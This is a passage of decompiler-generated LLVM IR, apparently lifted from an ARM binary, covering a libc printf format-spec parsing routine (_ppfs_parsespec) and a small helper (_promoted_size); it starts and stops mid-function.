  uselistorder label %dec_label_pc_151c4, { 1, 0 }
  uselistorder label %dec_label_pc_151b0, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_15124, { 1, 0 }
  uselistorder label %dec_label_pc_15118, { 1, 0 }
  uselistorder label %dec_label_pc_150f0, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_15288.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15284

dec_label_pc_15284:                               ; preds = %dec_label_pc_15290, %entry
  %v0_15284 = phi i32 [ %v1_15284, %dec_label_pc_15290 ], [ add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37518), %entry ]
  %v1_15284 = add i32 %v0_15284, -2
  %v2_15284 = inttoptr i32 %v1_15284 to i16*
  %v3_15284 = load i16, i16* %v2_15284, align 2
  %v4_15284 = sext i16 %v3_15284 to i32
  store i32 %v1_15284, i32* @ip, align 4
  %v9_15288 = icmp eq i32 %v4_15284, %v1_15288.pre
  br i1 %v9_15288, label %dec_label_pc_15284.dec_label_pc_15298_crit_edge, label %dec_label_pc_15290

dec_label_pc_15284.dec_label_pc_15298_crit_edge:  ; preds = %dec_label_pc_15284
  br label %dec_label_pc_15298

dec_label_pc_15290:                               ; preds = %dec_label_pc_15284
  %tmp = icmp ugt i32 %v1_15284, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37542)
  br i1 %tmp, label %dec_label_pc_15284, label %dec_label_pc_15298.loopexit

dec_label_pc_15298.loopexit:                      ; preds = %dec_label_pc_15290
  br label %dec_label_pc_15298

dec_label_pc_15298:                               ; preds = %dec_label_pc_15298.loopexit, %dec_label_pc_15284.dec_label_pc_15298_crit_edge
  %v2_152a8.pre-phi = sub i32 %v1_15284, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37542)
  store i32 %v2_152a8.pre-phi, i32* @r2, align 4
  %v4_152ac = sdiv i32 %v2_152a8.pre-phi, 2
  %v5_152ac = add i32 %v4_152ac, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37518)
  %v6_152ac = inttoptr i32 %v5_152ac to i8*
  %v7_152ac = load i8, i8* %v6_152ac, align 1
  %v9_152ac = zext i8 %v7_152ac to i32
  ret i32 %v9_152ac

; uselistorder directives
  uselistorder i32 %v2_152a8.pre-phi, { 1, 0 }
  uselistorder i32 %v1_15284, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37542), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_152c0 = load i32, i32* @r4, align 4
  store i32 %v3_152c0, i32* %stack_var_-36, align 4
  %v6_152c0 = load i32, i32* @r5, align 4
  %v27_152c0 = load i32, i32* @lr, align 4
  %v0_152c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_152c4 = add i32 %v0_152c4, 16
  %v2_152c4 = inttoptr i32 %v1_152c4 to i32*
  %v3_152c4 = load i32, i32* %v2_152c4, align 4
  %v1_152cc = and i32 %v3_152c4, 128
  store i32 %v1_152cc, i32* @r4, align 4
  %v2_152cc = icmp eq i32 %v1_152cc, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_152c4, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @lr, align 4
  %v1_152f4 = add i32 %v0_152c4, 24
  %v2_152f4 = inttoptr i32 %v1_152f4 to i32*
  %v3_152f4 = load i32, i32* %v2_152f4, align 4
  store i32 %v3_152f4, i32* %fp.global-to-local, align 4
  br i1 %v2_152cc, label %.dec_label_pc_15348_crit_edge, label %dec_label_pc_15300

.dec_label_pc_15348_crit_edge:                    ; preds = %entry
  %v2_152f8 = inttoptr i32 %v0_152c4 to i32*
  %v3_152f8 = load i32, i32* %v2_152f8, align 4
  store i32 %v3_152f8, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_15348

dec_label_pc_15300:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_15310 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_15304

dec_label_pc_15304:                               ; preds = %dec_label_pc_15334.dec_label_pc_15304_crit_edge, %dec_label_pc_15300
  %v1_15314 = phi i32 [ %v1_15324, %dec_label_pc_15334.dec_label_pc_15304_crit_edge ], [ 0, %dec_label_pc_15300 ]
  %v0_15304 = phi i32 [ %v0_15304.pre, %dec_label_pc_15334.dec_label_pc_15304_crit_edge ], [ %v0_152c4, %dec_label_pc_15300 ]
  %v1_15304 = inttoptr i32 %v0_15304 to i32*
  %v2_15304 = load i32, i32* %v1_15304, align 4
  %v4_15308 = mul i32 %v1_15314, 4
  %v5_15308 = add i32 %v2_15304, %v4_15308
  store i32 %v5_15308, i32* %r3.global-to-local, align 4
  %v1_1530c = add i32 %v5_15308, -4
  %v2_1530c = inttoptr i32 %v1_1530c to i8*
  %v3_1530c = load i8, i8* %v2_1530c, align 1
  %v4_1530c = zext i8 %v3_1530c to i32
  store i32 %v4_1530c, i32* %r1.global-to-local, align 4
  store i32 %v2_15310, i32* @ip, align 4
  %v2_15314 = add i32 %v1_15314, %v2_15310
  store i32 %v2_15314, i32* %r2.global-to-local, align 4
  %v3_15318 = add i32 %v2_15314, -72
  %v4_15318 = inttoptr i32 %v3_15318 to i8*
  store i8 %v3_1530c, i8* %v4_15318, align 1
  %v0_1531c = load i32, i32* %r3.global-to-local, align 4
  %v1_1531c = add i32 %v0_1531c, -4
  %v2_1531c = inttoptr i32 %v1_1531c to i32*
  %v3_1531c = load i32, i32* %v2_1531c, align 4
  store i32 %v3_1531c, i32* %r3.global-to-local, align 4
  %v0_15320 = load i32, i32* %r1.global-to-local, align 4
  %v9_15320 = icmp eq i32 %v0_15320, %v3_1531c
  %v0_15324 = load i32, i32* %r0.global-to-local, align 4
  %v1_15324 = add i32 %v0_15324, 1
  store i32 %v1_15324, i32* %r0.global-to-local, align 4
  br i1 %v9_15320, label %dec_label_pc_1532c, label %dec_label_pc_157f0

dec_label_pc_1532c:                               ; preds = %dec_label_pc_15304
  %v2_1532c = icmp eq i32 %v3_1531c, 0
  br i1 %v2_1532c, label %dec_label_pc_1533c, label %dec_label_pc_15334

dec_label_pc_15334:                               ; preds = %dec_label_pc_1532c
  %tmp182 = icmp ult i32 %v1_15324, 32
  br i1 %tmp182, label %dec_label_pc_15334.dec_label_pc_15304_crit_edge, label %dec_label_pc_1533c

dec_label_pc_15334.dec_label_pc_15304_crit_edge:  ; preds = %dec_label_pc_15334
  %v0_15304.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15304

dec_label_pc_1533c:                               ; preds = %dec_label_pc_15334, %dec_label_pc_1532c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_15344 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_15344, i32* %r0.global-to-local, align 4
  %v0_15354.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_15348

dec_label_pc_15348:                               ; preds = %.dec_label_pc_15348_crit_edge, %dec_label_pc_1533c
  %v3_1537c.pre-phi = phi i32 [ %.pre, %.dec_label_pc_15348_crit_edge ], [ %v2_15310, %dec_label_pc_1533c ]
  %v0_1537464 = phi i32 [ %v3_152f8, %.dec_label_pc_15348_crit_edge ], [ %v2_15344, %dec_label_pc_1533c ]
  %v0_15354 = phi i32 [ ptrtoint (i32* @global_var_2e024.1314 to i32), %.dec_label_pc_15348_crit_edge ], [ %v0_15354.pre, %dec_label_pc_1533c ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 580, i32* %r2.global-to-local, align 4
  %v2_15354 = add i32 %v0_15354, -37480
  store i32 %v2_15354, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_15368 = inttoptr i32 %v2_15354 to i8*
  store i8* %v4_15368, i8** %stack_var_-120, align 4
  br label %dec_label_pc_15374

dec_label_pc_15370:                               ; preds = %.thread20, %dec_label_pc_154a4
  %v0_15370 = phi i32 [ %v2_1551c, %.thread20 ], [ %v0_1548076, %dec_label_pc_154a4 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_154a4 ]
  store i32 %v0_15370, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15374

dec_label_pc_15374:                               ; preds = %dec_label_pc_15348, %dec_label_pc_15370
  %v1_15388 = phi i32 [ %v0_1537464, %dec_label_pc_15348 ], [ %v0_15370, %dec_label_pc_15370 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_15348 ], [ %stack_var_-44.0, %dec_label_pc_15370 ]
  %v1_15374 = inttoptr i32 %v1_15388 to i8*
  %v2_15374 = load i8, i8* %v1_15374, align 1
  %v3_15374 = zext i8 %v2_15374 to i32
  store i32 %v3_15374, i32* %r3.global-to-local, align 4
  %v7_15378 = icmp eq i8 %v2_15374, 42
  br i1 %v7_15378, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15374
  store i32 %v1_15388, i32* %r6.global-to-local, align 4
  %v0_1538c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1538c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_153d4.preheader

bb:                                               ; preds = %dec_label_pc_15374
  %v1_15380 = load i32, i32* %r8.global-to-local, align 4
  %v2_15380 = load i32, i32* %sb.global-to-local, align 4
  %v4_15380 = mul i32 %v2_15380, %v1_15380
  %v5_15380 = add i32 %v4_15380, %v3_1537c.pre-phi
  store i32 %v5_15380, i32* %r3.global-to-local, align 4
  %v2_15388 = add i32 %v1_15388, 1
  store i32 %v2_15388, i32* %r6.global-to-local, align 4
  %v0_1538c111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1538c111, i32* %r1.global-to-local, align 4
  %v3_15390 = add i32 %v5_15380, -40
  %v4_15390 = inttoptr i32 %v3_15390 to i32*
  store i32 %v0_1538c111, i32* %v4_15390, align 4
  %v0_153d8.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_153d4.preheader

dec_label_pc_153d4.preheader:                     ; preds = %.thread8, %bb
  %v0_153d8.pre = phi i32 [ %v1_15388, %.thread8 ], [ %v0_153d8.pre.pre, %bb ]
  %v0_153dc.pre = load i32, i32* @lr, align 4
  %v2_153dc = add i32 %v0_153dc.pre, 580
  %v3_153dc = inttoptr i32 %v2_153dc to i32*
  br label %dec_label_pc_153d4

dec_label_pc_15398:                               ; preds = %dec_label_pc_153d4
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_1539c = load i32, i32* %r1.global-to-local, align 4
  %v2_1539c = add i32 %v0_1539c, -214748363
  %tmp139 = sub i32 214748362, %v0_1539c
  %v6_1539c = and i32 %tmp139, %v0_1539c
  %v7_1539c = icmp slt i32 %v6_1539c, 0
  %v8_1539c = icmp slt i32 %v2_1539c, 0
  %v9_1539c = icmp eq i32 %v0_1539c, 214748363
  %v3_153a0 = xor i1 %v8_1539c, %v7_1539c
  %v4_153a0 = or i1 %v9_1539c, %v3_153a0
  br i1 %v4_153a0, label %dec_label_pc_153b8, label %dec_label_pc_153a4

dec_label_pc_153a4:                               ; preds = %dec_label_pc_15398
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_153a8 = icmp eq i32 %v0_1539c, 214748364
  br i1 %v9_153a8, label %dec_label_pc_153b0, label %dec_label_pc_153d0

dec_label_pc_153b0:                               ; preds = %dec_label_pc_153a4
  %v8_153b4 = icmp ugt i8 %v2_153d8, 55
  br i1 %v8_153b4, label %dec_label_pc_153d0, label %dec_label_pc_153b8

dec_label_pc_153b8:                               ; preds = %dec_label_pc_153b0, %dec_label_pc_15398
  %v2_153bc = mul i32 %v0_1539c, 10
  %v1_153c0 = add i32 %v2_153bc, -48
  store i32 %v1_153c0, i32* %r3.global-to-local, align 4
  %v2_153c4 = add i32 %v1_153c0, %v3_153d8
  br label %dec_label_pc_153d0

dec_label_pc_153d0:                               ; preds = %dec_label_pc_153b0, %dec_label_pc_153a4, %dec_label_pc_153b8
  %storemerge = phi i32 [ %v2_153c4, %dec_label_pc_153b8 ], [ 2147483647, %dec_label_pc_153a4 ], [ 2147483647, %dec_label_pc_153b0 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_153d0 = add i32 %v0_15458, 1
  store i32 %v1_153d0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_153d4

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153d4.preheader, %dec_label_pc_153d0
  %v0_15458 = phi i32 [ %v0_153d8.pre, %dec_label_pc_153d4.preheader ], [ %v1_153d0, %dec_label_pc_153d0 ]
  store i32 580, i32* %r2.global-to-local, align 4
  %v1_153d8 = inttoptr i32 %v0_15458 to i8*
  %v2_153d8 = load i8, i8* %v1_153d8, align 1
  %v3_153d8 = zext i8 %v2_153d8 to i32
  store i32 %v3_153d8, i32* @ip, align 4
  %v4_153dc = load i32, i32* %v3_153dc, align 4
  store i32 %v4_153dc, i32* %r3.global-to-local, align 4
  %v2_153e0 = mul nuw nsw i32 %v3_153d8, 2
  store i32 %v2_153e0, i32* %r2.global-to-local, align 4
  %v2_153e4 = add i32 %v2_153e0, %v4_153dc
  %v3_153e4 = inttoptr i32 %v2_153e4 to i16*
  %v4_153e4 = load i16, i16* %v3_153e4, align 2
  %v6_153e4 = zext i16 %v4_153e4 to i32
  store i32 %v6_153e4, i32* %r3.global-to-local, align 4
  %v1_153e8 = and i32 %v6_153e4, 8
  %v2_153e8 = icmp eq i32 %v1_153e8, 0
  br i1 %v2_153e8, label %dec_label_pc_153f0, label %dec_label_pc_15398

dec_label_pc_153f0:                               ; preds = %dec_label_pc_153d4
  %v0_153f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_153f0 = add i32 %v0_153f0, -1
  %v2_153f0 = inttoptr i32 %v1_153f0 to i8*
  %v3_153f0 = load i8, i8* %v2_153f0, align 1
  %v4_153f0 = zext i8 %v3_153f0 to i32
  store i32 %v4_153f0, i32* %r3.global-to-local, align 4
  %v7_153f4 = icmp eq i8 %v3_153f0, 37
  br i1 %v7_153f4, label %dec_label_pc_153fc, label %dec_label_pc_154bc

dec_label_pc_153fc:                               ; preds = %dec_label_pc_153f0
  %v7_153fc = icmp eq i8 %v2_153d8, 36
  %. = zext i1 %v7_153fc to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_15408 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_15408, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_153fc
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_153fc, %bb144
  %v0_15410 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_153fc ]
  %v2_15410 = icmp eq i32 %v0_15410, 0
  %v0_15444 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_15410, label %dec_label_pc_15444, label %dec_label_pc_15418

dec_label_pc_15418:                               ; preds = %thread-pre-split
  %v2_15444 = icmp eq i32 %v0_15444, 0
  %v1_1541c = add i32 %v0_15458, 1
  store i32 %v1_1541c, i32* %r0.global-to-local, align 4
  br i1 %v2_15444, label %dec_label_pc_157f0, label %dec_label_pc_15424

dec_label_pc_15424:                               ; preds = %dec_label_pc_15418
  %v2_15424 = sub i32 %v0_15408, %v0_15444
  %v4_15424 = xor i32 %v0_15444, %v0_15408
  %v5_15424 = xor i32 %v2_15424, %v0_15408
  %v6_15424 = and i32 %v5_15424, %v4_15424
  %v7_15424 = icmp slt i32 %v6_15424, 0
  %v8_15424 = icmp slt i32 %v2_15424, 0
  %v9_15424 = icmp eq i32 %v0_15408, %v0_15444
  %v3_15428 = xor i1 %v8_15424, %v7_15424
  %v4_15428 = or i1 %v9_15424, %v3_15428
  br i1 %v4_15428, label %dec_label_pc_15438, label %bb145

bb145:                                            ; preds = %dec_label_pc_15424
  store i32 %v0_15408, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15438

dec_label_pc_15434:                               ; preds = %dec_label_pc_15458, %dec_label_pc_15460
  %v0_15434 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15434, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15438

dec_label_pc_15438:                               ; preds = %bb145, %dec_label_pc_15424, %dec_label_pc_15434
  %v0_15438 = phi i32 [ %v0_153f0, %dec_label_pc_15434 ], [ %v1_1541c, %dec_label_pc_15424 ], [ %v1_1541c, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_15434 ], [ %v0_15408, %dec_label_pc_15424 ], [ %v0_15408, %bb145 ]
  store i32 %v0_15438, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_15474.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_15474 = ptrtoint i8* %v2_15474.pre to i32
  br label %dec_label_pc_15474

dec_label_pc_15444:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_15444, 1
  br i1 %tmp146, label %dec_label_pc_15458, label %dec_label_pc_1544c

dec_label_pc_1544c:                               ; preds = %dec_label_pc_15444
  %v7_1544c = icmp eq i8 %v2_153d8, 109
  br i1 %v7_1544c, label %dec_label_pc_154bc, label %dec_label_pc_157f0

dec_label_pc_15458:                               ; preds = %dec_label_pc_15444
  %tmp183 = icmp ugt i32 %v0_15458, %v0_153f0
  br i1 %tmp183, label %dec_label_pc_15460, label %dec_label_pc_15434

dec_label_pc_15460:                               ; preds = %dec_label_pc_15458
  %v1_15460 = inttoptr i32 %v0_153f0 to i8*
  %v2_15460 = load i8, i8* %v1_15460, align 1
  %v3_15460 = zext i8 %v2_15460 to i32
  store i32 %v3_15460, i32* %r3.global-to-local, align 4
  %v7_15464 = icmp eq i8 %v2_15460, 48
  br i1 %v7_15464, label %dec_label_pc_15434, label %bb147

bb147:                                            ; preds = %dec_label_pc_15460
  %v1_15468 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15468, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_154bc

dec_label_pc_15474.loopexit:                      ; preds = %dec_label_pc_1547c
  %v1_15488 = load i32, i32* @r4, align 4
  %v3_15488 = or i32 %v1_15488, %v0_1549c
  store i32 %v3_15488, i32* @r4, align 4
  %v2_1548c = add i32 %v0_1548076, 1
  store i32 %v2_1548c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15474

dec_label_pc_15474:                               ; preds = %dec_label_pc_15474.loopexit, %dec_label_pc_15438
  %v0_1548076 = phi i32 [ %v2_1548c, %dec_label_pc_15474.loopexit ], [ %v0_15438, %dec_label_pc_15438 ]
  store i32 %v3_15474, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15480 = inttoptr i32 %v0_1548076 to i8*
  br label %dec_label_pc_1547c

dec_label_pc_1547c:                               ; preds = %dec_label_pc_15494, %dec_label_pc_15474
  %v0_1549c = phi i32 [ %v2_1549c, %dec_label_pc_15494 ], [ 1, %dec_label_pc_15474 ]
  %v0_1547c = phi i32 [ %v5_1547c, %dec_label_pc_15494 ], [ %v3_15474, %dec_label_pc_15474 ]
  %v1_1547c = inttoptr i32 %v0_1547c to i8*
  %v2_1547c = load i8, i8* %v1_1547c, align 1
  %v3_1547c = zext i8 %v2_1547c to i32
  store i32 %v3_1547c, i32* %r2.global-to-local, align 4
  %v5_1547c = add i32 %v0_1547c, 1
  store i32 %v5_1547c, i32* %r0.global-to-local, align 4
  %v2_15480 = load i8, i8* %v1_15480, align 1
  %v3_15480 = zext i8 %v2_15480 to i32
  store i32 %v3_15480, i32* %r3.global-to-local, align 4
  %v9_15484 = icmp eq i8 %v2_15480, %v2_1547c
  br i1 %v9_15484, label %dec_label_pc_15474.loopexit, label %dec_label_pc_15494

dec_label_pc_15494:                               ; preds = %dec_label_pc_1547c
  %v1_15494 = inttoptr i32 %v5_1547c to i8*
  %v2_15494 = load i8, i8* %v1_15494, align 1
  %v3_15494 = zext i8 %v2_15494 to i32
  store i32 %v3_15494, i32* %r3.global-to-local, align 4
  %v2_15498 = icmp eq i8 %v2_15494, 0
  %v2_1549c = mul i32 %v0_1549c, 2
  store i32 %v2_1549c, i32* %r1.global-to-local, align 4
  br i1 %v2_15498, label %dec_label_pc_154a4, label %dec_label_pc_1547c

dec_label_pc_154a4:                               ; preds = %dec_label_pc_15494
  %v1_154a4 = add i32 %v0_1548076, -1
  %v2_154a4 = inttoptr i32 %v1_154a4 to i8*
  %v3_154a4 = load i8, i8* %v2_154a4, align 1
  %v7_154a8 = icmp eq i8 %v3_154a4, 37
  %v0_154ac = load i32, i32* @r4, align 4
  %v1_154ac = and i32 %v0_154ac, 10
  store i32 %v1_154ac, i32* %r3.global-to-local, align 4
  %v4_154b0 = udiv i32 %v1_154ac, 2
  %v5_154b0 = sub nuw nsw i32 -1, %v4_154b0
  %v6_154b0 = and i32 %v0_154ac, %v5_154b0
  store i32 %v6_154b0, i32* @r4, align 4
  br i1 %v7_154a8, label %dec_label_pc_154b8, label %dec_label_pc_15370

dec_label_pc_154b8:                               ; preds = %dec_label_pc_154a4
  %v0_154b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_154b8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154bc

dec_label_pc_154bc:                               ; preds = %bb147, %dec_label_pc_153f0, %dec_label_pc_1544c, %dec_label_pc_154b8
  %v1_154fc = phi i32 [ %v0_1548076, %dec_label_pc_154b8 ], [ %v0_15458, %bb147 ], [ %v0_15458, %dec_label_pc_1544c ], [ %v0_15458, %dec_label_pc_153f0 ]
  %v0_154f8 = phi i32 [ %v5_1547c, %dec_label_pc_154b8 ], [ %v0_153f0, %bb147 ], [ %v0_153f0, %dec_label_pc_1544c ], [ %v0_153f0, %dec_label_pc_153f0 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_154b8 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_1544c ], [ %stack_var_-44.1, %dec_label_pc_153f0 ]
  %v1_154bc = inttoptr i32 %v0_154f8 to i8*
  %v2_154bc = load i8, i8* %v1_154bc, align 1
  %v3_154bc = zext i8 %v2_154bc to i32
  store i32 %v3_154bc, i32* %r3.global-to-local, align 4
  %v7_154c0 = icmp eq i8 %v2_154bc, 42
  br i1 %v7_154c0, label %dec_label_pc_154c8, label %dec_label_pc_15508

dec_label_pc_154c8:                               ; preds = %dec_label_pc_154bc
  %v0_154c8 = load i32, i32* %fp.global-to-local, align 4
  %v2_154c8 = icmp eq i32 %v0_154c8, 0
  br i1 %v2_154c8, label %dec_label_pc_154f8, label %dec_label_pc_154d0

dec_label_pc_154d0:                               ; preds = %dec_label_pc_154c8
  %v1_154d0 = inttoptr i32 %v1_154fc to i8*
  %v2_154d0 = load i8, i8* %v1_154d0, align 1
  %v3_154d0 = zext i8 %v2_154d0 to i32
  store i32 %v3_154d0, i32* %r3.global-to-local, align 4
  %v7_154d4 = icmp eq i8 %v2_154d0, 36
  br i1 %v7_154d4, label %dec_label_pc_154dc, label %dec_label_pc_157f0

dec_label_pc_154dc:                               ; preds = %dec_label_pc_154d0
  %v0_154dc = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_154dc, 1
  br i1 %tmp148, label %dec_label_pc_157f0, label %dec_label_pc_154e4

dec_label_pc_154e4:                               ; preds = %dec_label_pc_154dc
  %v0_154e8 = load i32, i32* %r8.global-to-local, align 4
  %v1_154e8 = load i32, i32* %sb.global-to-local, align 4
  %v3_154e8 = mul i32 %v1_154e8, %v0_154e8
  %v4_154e8 = add i32 %v3_154e8, %v3_1537c.pre-phi
  store i32 %v4_154e8, i32* %r3.global-to-local, align 4
  %v1_154ec = add i32 %v1_154fc, 1
  store i32 %v1_154ec, i32* %r6.global-to-local, align 4
  %v2_154f0 = add i32 %v4_154e8, -12
  %v3_154f0 = inttoptr i32 %v2_154f0 to i32*
  store i32 %v0_154dc, i32* %v3_154f0, align 4
  br label %dec_label_pc_15504

dec_label_pc_154f8:                               ; preds = %dec_label_pc_154c8
  %v1_154f8 = add i32 %v0_154f8, 1
  store i32 %v1_154f8, i32* %r3.global-to-local, align 4
  %v9_154fc = icmp eq i32 %v1_154f8, %v1_154fc
  br i1 %v9_154fc, label %dec_label_pc_15504, label %dec_label_pc_157f0

dec_label_pc_15504:                               ; preds = %dec_label_pc_154f8, %dec_label_pc_154e4
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15508

dec_label_pc_15508:                               ; preds = %dec_label_pc_154bc, %dec_label_pc_15504
  %v0_15508 = load i32, i32* %r8.global-to-local, align 4
  %v2_15508 = icmp eq i32 %v0_15508, 0
  br i1 %v2_15508, label %dec_label_pc_15514, label %dec_label_pc_15534.loopexit

dec_label_pc_15514:                               ; preds = %dec_label_pc_15508
  %v0_15514 = load i32, i32* %r6.global-to-local, align 4
  %v1_15514 = inttoptr i32 %v0_15514 to i8*
  %v2_15514 = load i8, i8* %v1_15514, align 1
  %v3_15514 = zext i8 %v2_15514 to i32
  store i32 %v3_15514, i32* %r3.global-to-local, align 4
  %v7_15518 = icmp eq i8 %v2_15514, 46
  br i1 %v7_15518, label %.thread20, label %dec_label_pc_1552c

.thread20:                                        ; preds = %dec_label_pc_15514
  %v2_1551c = add i32 %v0_15514, 1
  store i32 %v2_1551c, i32* %r6.global-to-local, align 4
  %v1_15520 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_15520, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15370

dec_label_pc_1552c:                               ; preds = %dec_label_pc_15514
  %v0_1552c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1552c, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_15534

dec_label_pc_15534.loopexit:                      ; preds = %dec_label_pc_15508
  %v1_1550c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_1550c, i32* @r5, align 4
  %v0_15540.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15534

dec_label_pc_15534:                               ; preds = %dec_label_pc_15534.loopexit, %dec_label_pc_1552c
  %v0_15540.pre = phi i32 [ %v0_15540.pre.pre, %dec_label_pc_15534.loopexit ], [ %v0_15514, %dec_label_pc_1552c ]
  store i32 -37604, i32* %r3.global-to-local, align 4
  %v0_15538 = load i32, i32* @lr, align 4
  %v2_15538 = add i32 %v0_15538, -37604
  store i32 %v2_15538, i32* %r1.global-to-local, align 4
  %v1_15540 = inttoptr i32 %v0_15540.pre to i8*
  br label %dec_label_pc_1553c

dec_label_pc_1553c:                               ; preds = %dec_label_pc_15550, %dec_label_pc_15534
  %v0_15550 = phi i32 [ %v1_15550, %dec_label_pc_15550 ], [ %v2_15538, %dec_label_pc_15534 ]
  %v1_1553c = inttoptr i32 %v0_15550 to i8*
  %v2_1553c = load i8, i8* %v1_1553c, align 1
  %v3_1553c = zext i8 %v2_1553c to i32
  store i32 %v3_1553c, i32* %r2.global-to-local, align 4
  %v2_15540 = load i8, i8* %v1_15540, align 1
  %v3_15540 = zext i8 %v2_15540 to i32
  store i32 %v3_15540, i32* %r3.global-to-local, align 4
  %v9_15544 = icmp eq i8 %v2_15540, %v2_1553c
  br i1 %v9_15544, label %bb149, label %dec_label_pc_15550

bb149:                                            ; preds = %dec_label_pc_1553c
  %v2_15548 = add i32 %v0_15540.pre, 1
  store i32 %v2_15548, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1555c

dec_label_pc_15550:                               ; preds = %dec_label_pc_1553c
  %v1_15550 = add i32 %v0_15550, 1
  %v2_15550 = inttoptr i32 %v1_15550 to i8*
  %v3_15550 = load i8, i8* %v2_15550, align 1
  %v4_15550 = zext i8 %v3_15550 to i32
  store i32 %v4_15550, i32* %r3.global-to-local, align 4
  store i32 %v1_15550, i32* %r1.global-to-local, align 4
  %v2_15554 = icmp eq i8 %v3_15550, 0
  br i1 %v2_15554, label %dec_label_pc_1555c, label %dec_label_pc_1553c

dec_label_pc_1555c:                               ; preds = %dec_label_pc_15550, %bb149
  %v1_15580 = phi i32 [ %v2_15548, %bb149 ], [ %v0_15540.pre, %dec_label_pc_15550 ]
  %v1_1557c = phi i32 [ %v0_15550, %bb149 ], [ %v1_15550, %dec_label_pc_15550 ]
  %v2_15564 = sub i32 %v1_1557c, %v2_15538
  store i32 %v2_15564, i32* %r3.global-to-local, align 4
